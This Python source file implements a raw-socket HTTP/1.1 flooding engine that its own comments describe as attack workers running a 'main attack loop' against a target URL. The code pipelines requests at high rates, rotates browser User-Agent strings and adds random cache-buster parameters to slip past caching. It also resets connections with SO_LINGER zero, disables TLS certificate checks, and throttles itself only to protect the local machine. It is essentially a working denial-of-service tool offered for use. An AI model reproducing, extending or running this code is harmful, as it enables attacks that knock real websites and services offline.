"""
Raw HTTP/1.1 Engine with Pipelining
====================================
Direct socket-level HTTP/1.1 client with:
- Connection pool (max 50 per worker)
- HTTP Pipelining (6 requests per connection, fire-and-forget)
- Minimal payload (<300 bytes per request)
- TCP_NODELAY, SO_REUSEADDR, SO_LINGER zero
- WSAEWOULDBLOCK detection with self-throttling
- Per-send buffer validation (socket.send return == len(payload))

Designed specifically to bypass:
- aiohttp connection pool exhaustion
- curl_cffi single-thread RPS cap (~300)
- Windows IOCP overhead for high-frequency small packets

Threading model:
- Spawned inside an asyncio event loop (one per attack thread)
- Uses asyncio.open_connection for non-blocking I/O
- Reports metrics via thread-safe queue
"""
from __future__ import annotations

import asyncio
import errno
import logging
import os
import random
import socket
import ssl
import struct
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger("raw_http_engine")

WSAEWOULDBLOCK = 10035

# Compact User-Agent pool (modern browsers, 2026)
_UA_POOL: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
]


# ----------------------------------------------------------------------
# Metrics
# ----------------------------------------------------------------------

@dataclass
class EngineMetrics:
    """Thread-safe metrics counter for the raw engine."""
    sent: int = 0                 # socket.send returned full payload len
    completed: int = 0            # received any HTTP response status line
    failed: int = 0               # connect/send/recv failure
    timeout: int = 0              # asyncio.TimeoutError
    local_drops: int = 0          # send returned < len(payload)
    wsa_blocks: int = 0           # WSAEWOULDBLOCK / EAGAIN occurrences
    bytes_sent: int = 0
    started_at: float = field(default_factory=time.time)

    @property
    def total(self) -> int:
        return self.sent + self.failed + self.timeout

    def actual_rps(self) -> float:
        elapsed = time.time() - self.started_at
        if elapsed <= 0:
            return 0.0
        return self.sent / elapsed


# ----------------------------------------------------------------------
# Connection
# ----------------------------------------------------------------------

class RawConnection:
    """
    Single keep-alive HTTP/1.1 connection.
    Reuses for `pipeline_depth` requests before recycling.
    """

    __slots__ = ("host", "port", "is_ssl", "sock", "_use_count", "_max_uses")

    def __init__(
        self,
        host: str,
        port: int,
        is_ssl: bool,
        max_uses: int = 100,
    ) -> None:
        self.host = host
        self.port = port
        self.is_ssl = is_ssl
        self.sock: Optional[socket.socket] = None
        self._use_count = 0
        self._max_uses = max_uses

    def open(self, timeout: float = 5.0) -> bool:
        """Open and tune the socket. Returns True on success."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Tuning BEFORE connect
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except OSError:
                pass
            try:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except OSError:
                pass
            # SO_LINGER zero only for non-localhost (loopback servers don't handle RST well)
            is_loopback = (self.host == "127.0.0.1" or self.host == "localhost" or
                           self.host.startswith("127."))
            if not is_loopback:
                try:
                    # SO_LINGER: linger=1, timeout=0 -> RST on close, no TIME_WAIT
                    linger = struct.pack("ii", 1, 0)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, linger)
                except OSError:
                    pass
            try:
                # Small SNDBUF prevents Winsock queue buildup
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 8192)
            except OSError:
                pass

            sock.settimeout(timeout)
            sock.connect((self.host, self.port))

            if self.is_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.set_alpn_protocols(["http/1.1"])
                try:
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
                except ssl.SSLError:
                    sock.close()
                    return False

            self.sock = sock
            self._use_count = 0
            return True
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug("[raw] connect %s:%d failed: %s", self.host, self.port, e)
            return False
        except Exception as e:
            logger.debug("[raw] connect unexpected: %s", e)
            return False

    def is_alive(self) -> bool:
        return self.sock is not None and self._use_count < self._max_uses

    def send_chunked(self, payload: bytes, chunk_size: int = 1024) -> int:
        """
        Send payload in chunks (max chunk_size bytes).
        Returns total bytes actually sent (must equal len(payload) for success).
        Raises BlockingIOError / OSError on backpressure.
        """
        if self.sock is None:
            raise OSError("socket is None")
        total_sent = 0
        view = memoryview(payload)
        n = len(payload)
        while total_sent < n:
            end = min(total_sent + chunk_size, n)
            try:
                w = self.sock.send(view[total_sent:end])
            except BlockingIOError:
                raise
            except OSError:
                raise
            if w == 0:
                # Peer closed
                raise ConnectionResetError("send returned 0")
            total_sent += w
        self._use_count += 1
        return total_sent

    def recv_status_line(self, max_bytes: int = 256) -> Optional[bytes]:
        """
        Read first line of response (HTTP/1.1 200 OK\r\n).
        Returns None on timeout or error.
        """
        if self.sock is None:
            return None
        try:
            buf = bytearray()
            while len(buf) < max_bytes:
                chunk = self.sock.recv(min(64, max_bytes - len(buf)))
                if not chunk:
                    break
                buf.extend(chunk)
                if b"\r\n" in buf:
                    break
            if not buf:
                return None
            line, _, _ = bytes(buf).partition(b"\r\n")
            return line
        except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
            return None

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None


# ----------------------------------------------------------------------
# Connection Pool
# ----------------------------------------------------------------------

class ConnectionPool:
    """
    Per-worker connection pool.
    Reuses RawConnection objects to avoid TCP handshake on every request.
    """

    def __init__(self, host: str, port: int, is_ssl: bool, max_size: int = 50) -> None:
        self.host = host
        self.port = port
        self.is_ssl = is_ssl
        self.max_size = max_size
        self._free: List[RawConnection] = []
        self._in_use_count: int = 0
        self._lock = threading.Lock()

    def acquire(self) -> Optional[RawConnection]:
        """Pop a free connection or create a new one if under max_size."""
        with self._lock:
            while self._free:
                conn = self._free.pop()
                if conn.is_alive():
                    self._in_use_count += 1
                    return conn
                conn.close()
            if self._in_use_count >= self.max_size:
                return None
            self._in_use_count += 1
        # Create outside lock
        conn = RawConnection(self.host, self.port, self.is_ssl, max_uses=80)
        if not conn.open(timeout=5.0):
            with self._lock:
                self._in_use_count -= 1
            return None
        return conn

    def release(self, conn: RawConnection, reusable: bool = True) -> None:
        with self._lock:
            self._in_use_count -= 1
            if reusable and conn.is_alive() and len(self._free) < self.max_size:
                self._free.append(conn)
                return
        conn.close()

    def close_all(self) -> None:
        with self._lock:
            free = list(self._free)
            self._free.clear()
        for c in free:
            c.close()


# ----------------------------------------------------------------------
# Request builder
# ----------------------------------------------------------------------

def build_minimal_request(host: str, path: str, ua: str) -> bytes:
    """
    Build minimal HTTP/1.1 GET request (<300 bytes).
    Headers: Host, User-Agent, Accept, Connection.
    """
    # Cache buster
    if "?" in path:
        path = f"{path}&_={random.randint(0, 999999)}"
    else:
        path = f"{path}?_={random.randint(0, 999999)}"

    # Truncate UA if too long
    if len(ua) > 140:
        ua = ua[:140]

    req = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )
    return req.encode("ascii", errors="replace")


# ----------------------------------------------------------------------
# Worker
# ----------------------------------------------------------------------

class RawHttpWorker:
    """
    Single attack worker running in its own asyncio loop.
    Uses raw socket pool to send pipelined HTTP/1.1 requests.

    Reports metrics via thread-safe stats_queue (queue.Queue).
    Listens for stop_event to exit cleanly.
    """

    def __init__(
        self,
        target_url: str,
        target_rps: int,
        duration_seconds: float,
        worker_id: int,
        stats_queue,             # queue.Queue
        stop_event,              # threading.Event
        rps_factor_callable=None,  # callable () -> float (from SelfHealthMonitor)
        wsa_block_callback=None,   # callable (count) -> None
        local_drop_callback=None,  # callable (count) -> None
        pipeline_depth: int = 6,
        pool_size: int = 50,
        send_chunk: int = 1024,
        path: str = "/",
    ) -> None:
        self.target_url = target_url
        self.target_rps = max(1, int(target_rps))
        self.duration_seconds = float(duration_seconds)
        self.worker_id = worker_id
        self.stats_queue = stats_queue
        self.stop_event = stop_event
        self.rps_factor_callable = rps_factor_callable or (lambda: 1.0)
        self.wsa_block_callback = wsa_block_callback or (lambda c: None)
        self.local_drop_callback = local_drop_callback or (lambda c: None)
        self.pipeline_depth = max(1, int(pipeline_depth))
        self.pool_size = max(1, int(pool_size))
        self.send_chunk = max(64, int(send_chunk))
        self.path = path or "/"

        # Parse target
        parsed = urlparse(target_url)
        self.host = parsed.hostname or parsed.netloc.split(":")[0]
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.is_ssl = parsed.scheme == "https"
        if parsed.path:
            self.path = parsed.path
            if parsed.query:
                self.path += "?" + parsed.query

        # Metrics
        self.metrics = EngineMetrics()
        self._last_report_time: float = time.time()
        self._last_sent_count: int = 0

    # ------------------------------------------------------------------
    # Stats reporting
    # ------------------------------------------------------------------

    def _push_stats(self, force: bool = False) -> None:
        """Push snapshot to stats queue (drop oldest if full)."""
        now = time.time()
        if not force and (now - self._last_report_time) < 0.25:
            return
        elapsed = max(1e-6, now - self.metrics.started_at)
        instant_rps = (self.metrics.sent - self._last_sent_count) / max(
            1e-6, now - self._last_report_time
        )
        avg_rps = self.metrics.sent / elapsed

        snapshot = {
            "worker_id": self.worker_id,
            "ts": now,
            "sent": self.metrics.sent,
            "completed": self.metrics.completed,
            "failed": self.metrics.failed,
            "timeout": self.metrics.timeout,
            "local_drops": self.metrics.local_drops,
            "wsa_blocks": self.metrics.wsa_blocks,
            "bytes_sent": self.metrics.bytes_sent,
            "instant_rps": instant_rps,
            "avg_rps": avg_rps,
            "elapsed": elapsed,
        }

        try:
            self.stats_queue.put_nowait(snapshot)
        except Exception:
            # Queue full - drop oldest, push new
            try:
                self.stats_queue.get_nowait()
                self.stats_queue.put_nowait(snapshot)
            except Exception:
                pass

        self._last_report_time = now
        self._last_sent_count = self.metrics.sent

    # ------------------------------------------------------------------
    # Single pipelined burst
    # ------------------------------------------------------------------

    async def _send_pipelined_burst(self, pool: ConnectionPool) -> int:
        """
        Acquire connection, send pipeline_depth requests fire-and-forget,
        try to read first status line. Returns number of requests successfully sent.
        Runs blocking socket ops in thread executor to avoid blocking event loop.

        FIX: On WSAEWOULDBLOCK mid-pipeline, retry up to 3 times with 5ms backoff
        instead of immediately aborting. Even on partial pipeline failure, still
        read the response for already-sent requests.
        """
        conn = await asyncio.get_event_loop().run_in_executor(None, pool.acquire)
        if conn is None:
            self.metrics.failed += 1
            return 0

        sent_count = 0
        recycle = True
        try:
            ua = _UA_POOL[random.randint(0, len(_UA_POOL) - 1)]
            payload = build_minimal_request(self.host, self.path, ua)

            # Pipeline: send N requests back-to-back without reading
            pipe_remaining = self.pipeline_depth
            retry_count = 0
            max_pipe_retries = 3
            while pipe_remaining > 0 and not self.stop_event.is_set():
                try:
                    w = await asyncio.get_event_loop().run_in_executor(
                        None, conn.send_chunked, payload, self.send_chunk
                    )
                    if w == len(payload):
                        self.metrics.sent += 1
                        self.metrics.bytes_sent += w
                        sent_count += 1
                        pipe_remaining -= 1
                        retry_count = 0
                    else:
                        # Partial send - local drop
                        self.metrics.local_drops += 1
                        self.local_drop_callback(1)
                        recycle = False
                        break
                except BlockingIOError:
                    retry_count += 1
                    if retry_count >= max_pipe_retries:
                        self.metrics.wsa_blocks += 1
                        self.wsa_block_callback(1)
                        recycle = False
                        await asyncio.sleep(0.01)
                        break
                    # Brief backoff then retry same position
                    await asyncio.sleep(0.005 * retry_count)
                except (ConnectionResetError, BrokenPipeError):
                    self.metrics.failed += 1
                    if sent_count > 0:
                        self.metrics.wsa_blocks += 1
                    recycle = False
                    break
                except OSError as e:
                    err = getattr(e, "errno", None)
                    if err in (WSAEWOULDBLOCK, errno.EAGAIN, errno.EWOULDBLOCK):
                        retry_count += 1
                        if retry_count >= max_pipe_retries:
                            self.metrics.wsa_blocks += 1
                            self.wsa_block_callback(1)
                            recycle = False
                            await asyncio.sleep(0.01)
                            break
                        await asyncio.sleep(0.005 * retry_count)
                    else:
                        self.metrics.failed += 1
                        recycle = False
                        break
                except Exception:
                    self.metrics.failed += 1
                    recycle = False
                    break

            # Always try to read a response line if we sent anything,
            # even if recycling was compromised (partial pipeline).
            # This recovers completed count for what was actually sent.
            if sent_count > 0:
                try:
                    line = await asyncio.wait_for(
                        asyncio.get_event_loop().run_in_executor(
                            None, conn.recv_status_line, 256
                        ),
                        timeout=2.0,
                    )
                    if line and (b" 2" in line or b" 3" in line or
                                 b" 4" in line or b" 5" in line):
                        self.metrics.completed += sent_count
                except asyncio.TimeoutError:
                    self.metrics.timeout += 1
                    recycle = False
                except Exception:
                    pass
        finally:
            await asyncio.get_event_loop().run_in_executor(
                None, pool.release, conn, recycle
            )

        return sent_count

    # ------------------------------------------------------------------
    # Worker main loop
    # ------------------------------------------------------------------

    async def run(self) -> EngineMetrics:
        """Main attack loop. Returns final metrics."""
        pool = ConnectionPool(self.host, self.port, self.is_ssl, max_size=self.pool_size)
        start = time.time()
        self.metrics.started_at = start

        # Concurrent burst tasks (limited)
        active_tasks: set = set()
        max_concurrent = max(4, min(32, self.pool_size // 2))

        last_throttle_log = 0.0
        try:
            while not self.stop_event.is_set():
                elapsed = time.time() - start
                if elapsed >= self.duration_seconds:
                    break

                # Adaptive RPS factor from SelfHealthMonitor
                factor = self.rps_factor_callable()
                effective_rps = max(1, int(self.target_rps * factor))

                # Pipeline reduces external loop iterations
                target_bursts_per_sec = max(1, effective_rps // self.pipeline_depth)
                burst_interval = 1.0 / target_bursts_per_sec

                # Spawn one burst task
                if len(active_tasks) < max_concurrent:
                    task = asyncio.create_task(self._send_pipelined_burst(pool))
                    active_tasks.add(task)
                    task.add_done_callback(active_tasks.discard)

                # Push stats
                self._push_stats(force=False)

                # Adaptive sleep: if behind target, yield only; else throttle
                expected_sent = elapsed * effective_rps
                if self.metrics.sent < expected_sent:
                    await asyncio.sleep(0)
                else:
                    # Brief throttle log
                    now = time.time()
                    if now - last_throttle_log > 5.0:
                        last_throttle_log = now
                    await asyncio.sleep(burst_interval)

            # Wait for in-flight bursts (limited)
            if active_tasks:
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*active_tasks, return_exceptions=True),
                        timeout=5.0,
                    )
                except asyncio.TimeoutError:
                    for t in active_tasks:
                        t.cancel()
        finally:
            pool.close_all()
            self._push_stats(force=True)

        return self.metrics


# ----------------------------------------------------------------------
# Entry point: run worker in dedicated thread
# ----------------------------------------------------------------------

def run_worker_in_thread(
    target_url: str,
    target_rps: int,
    duration_seconds: float,
    worker_id: int,
    stats_queue,
    stop_event,
    rps_factor_callable=None,
    wsa_block_callback=None,
    local_drop_callback=None,
    pipeline_depth: int = 6,
    pool_size: int = 50,
    send_chunk: int = 1024,
    result_dict: Optional[dict] = None,
) -> None:
    """
    Thread entry point. Creates new asyncio event loop and runs worker.
    Must be called as the target of threading.Thread.
    """
    if sys.platform == "win32":
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except Exception:
            pass

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    worker = RawHttpWorker(
        target_url=target_url,
        target_rps=target_rps,
        duration_seconds=duration_seconds,
        worker_id=worker_id,
        stats_queue=stats_queue,
        stop_event=stop_event,
        rps_factor_callable=rps_factor_callable,
        wsa_block_callback=wsa_block_callback,
        local_drop_callback=local_drop_callback,
        pipeline_depth=pipeline_depth,
        pool_size=pool_size,
        send_chunk=send_chunk,
    )

    try:
        metrics = loop.run_until_complete(worker.run())
        if result_dict is not None:
            result_dict["sent"] = metrics.sent
            result_dict["completed"] = metrics.completed
            result_dict["failed"] = metrics.failed
            result_dict["timeout"] = metrics.timeout
            result_dict["local_drops"] = metrics.local_drops
            result_dict["wsa_blocks"] = metrics.wsa_blocks
            result_dict["bytes_sent"] = metrics.bytes_sent
            result_dict["actual_rps"] = metrics.actual_rps()
    except Exception as e:
        logger.error("[raw worker %d] fatal: %s", worker_id, e)
        if result_dict is not None:
            result_dict["error"] = str(e)
    finally:
        try:
            pending = asyncio.all_tasks(loop)
            for t in pending:
                t.cancel()
            loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        except Exception:
            pass
        try:
            loop.close()
        except Exception:
            pass


# ----------------------------------------------------------------------
# Ping check (for phase 4.5 gate validation)
# ----------------------------------------------------------------------

async def ping_target_rtt(target_url: str, timeout: float = 5.0) -> Optional[float]:
    """
    Send 1 HTTP/1.1 GET to target with `Expect: 100-continue` and measure RTT.
    Returns RTT in milliseconds, or None on failure.
    """
    parsed = urlparse(target_url)
    host = parsed.hostname or parsed.netloc.split(":")[0]
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    is_ssl = parsed.scheme == "https"
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query

    ssl_ctx = None
    if is_ssl:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE

    writer = None
    t0 = time.perf_counter()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ssl_ctx,
                                    server_hostname=host if is_ssl else None),
            timeout=timeout,
        )
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: HealthCheck/2.0\r\n"
            f"Accept: */*\r\n"
            f"Expect: 100-continue\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("ascii")
        writer.write(req)
        await asyncio.wait_for(writer.drain(), timeout=timeout)

        # Read first line
        try:
            line = await asyncio.wait_for(reader.readline(), timeout=timeout)
        except asyncio.TimeoutError:
            return None
        if not line:
            return None
        rtt_ms = (time.perf_counter() - t0) * 1000.0
        return rtt_ms
    except asyncio.TimeoutError:
        return None
    except Exception as e:
        logger.debug("[ping] %s failed: %s", target_url, e)
        return None
    finally:
        if writer is not None:
            try:
                writer.close()
                try:
                    await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
                except Exception:
                    pass
            except Exception:
                pass


# ----------------------------------------------------------------------
# Quick fallback check (5s window)
# ----------------------------------------------------------------------

async def quick_throughput_probe(
    target_url: str,
    target_rps: int,
    probe_seconds: float = 5.0,
) -> Tuple[int, float]:
    """
    Send requests for `probe_seconds` and return (total_sent, actual_rps).
    Used by Auto Mode to detect if engine is achieving acceptable RPS.
    """
    import queue as _queue
    stats_q: _queue.Queue = _queue.Queue(maxsize=100)
    stop_evt = threading.Event()
    result: dict = {}

    th = threading.Thread(
        target=run_worker_in_thread,
        kwargs=dict(
            target_url=target_url,
            target_rps=target_rps,
            duration_seconds=probe_seconds,
            worker_id=999,
            stats_queue=stats_q,
            stop_event=stop_evt,
            pipeline_depth=6,
            pool_size=20,
            result_dict=result,
        ),
        daemon=True,
    )
    th.start()
    th.join(timeout=probe_seconds + 5)
    if th.is_alive():
        stop_evt.set()
        th.join(timeout=2)

    sent = result.get("sent", 0)
    rps = result.get("actual_rps", 0.0)
    return sent, rps
